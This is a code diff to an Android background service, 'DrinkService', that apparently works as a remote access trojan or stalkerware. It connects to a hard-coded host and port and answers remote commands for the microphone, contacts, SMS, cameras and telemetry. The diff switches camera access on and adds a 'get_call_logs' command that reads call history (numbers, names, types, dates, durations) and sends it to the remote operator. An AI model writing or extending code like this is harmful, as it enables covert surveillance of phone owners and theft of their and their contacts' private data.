@@ -39,6 +39,7 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.os.StatFs
 import android.os.SystemClock
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.telephony.TelephonyManager
@@ -59,7 +60,7 @@ class DrinkService : Service() {
     companion object {
         const val ACTION_STATUS = "com.drink.STATUS"
         const val EXTRA_CONNECTED = "connected"
-        const val ENABLE_CAMERA = false
+        const val ENABLE_CAMERA = true
         @Volatile var isConnected = false
         private const val HOST = "192.168.1.149"
         private const val PORT = 33110
@@ -199,6 +200,7 @@ class DrinkService : Service() {
                     "stop_mic" -> handleStopMic()
                     "get_contacts" -> handleContacts(sm)
                     "get_sms" -> handleSms(sm, frame)
+                    "get_call_logs" -> handleCallLogs(sm, frame)
                     "list_cams" -> if (ENABLE_CAMERA) handleListCams(sm) else sendCameraDisabled(sm)
                     "use_cam" -> if (ENABLE_CAMERA) handleUseCam(sm, frame) else sendCameraDisabled(sm)
                     "get_telemetry" -> handleTelemetry(sm)
@@ -448,6 +450,72 @@ class DrinkService : Service() {
                         put("body", if (bodyIdx != -1) it.getString(bodyIdx) ?: "" else "")
                         put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
                         put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
+                    })
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        return result
+    }
+
+    private suspend fun handleCallLogs(sm: SocketManager, frame: JSONObject) = withContext(Dispatchers.IO) {
+        try {
+            val hours = frame.optInt("hours", 24)
+            val calls = readCallLogs(hours)
+            val response = JSONObject().apply {
+                put("type", "call_logs")
+                put("hours", hours)
+                put("data", calls)
+            }
+            sm.sendFrame(response)
+        } catch (e: Exception) {
+            runCatching {
+                val errorHeader = JSONObject().apply {
+                    put("type", "error")
+                    put("cmd", "call_logs")
+                    put("message", e.message ?: "Failed to read call logs")
+                }
+                sm.sendFrame(errorHeader)
+            }
+        }
+    }
+
+    private fun readCallLogs(hours: Int): JSONArray {
+        val result = JSONArray()
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            return result
+        }
+        try {
+            val since = if (hours > 0) System.currentTimeMillis() - hours.toLong() * 60 * 60 * 1000L else 0L
+            val selection = if (since > 0) "${CallLog.Calls.DATE} > ?" else null
+            val selectionArgs = if (since > 0) arrayOf(since.toString()) else null
+            val cursor = contentResolver.query(
+                CallLog.Calls.CONTENT_URI,
+                arrayOf(
+                    CallLog.Calls.NUMBER,
+                    CallLog.Calls.CACHED_NAME,
+                    CallLog.Calls.TYPE,
+                    CallLog.Calls.DATE,
+                    CallLog.Calls.DURATION,
+                ),
+                selection,
+                selectionArgs,
+                "${CallLog.Calls.DATE} DESC"
+            ) ?: return result
+            cursor.use {
+                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
+                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
+                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
+                while (it.moveToNext()) {
+                    result.put(JSONObject().apply {
+                        put("number", if (numIdx != -1) it.getString(numIdx) ?: "" else "")
+                        put("name", if (nameIdx != -1) it.getString(nameIdx) ?: "" else "")
+                        put("type", if (typeIdx != -1) it.getInt(typeIdx) else 0)
+                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
+                        put("duration", if (durIdx != -1) it.getInt(durIdx) else 0)
                     })
                 }
             }
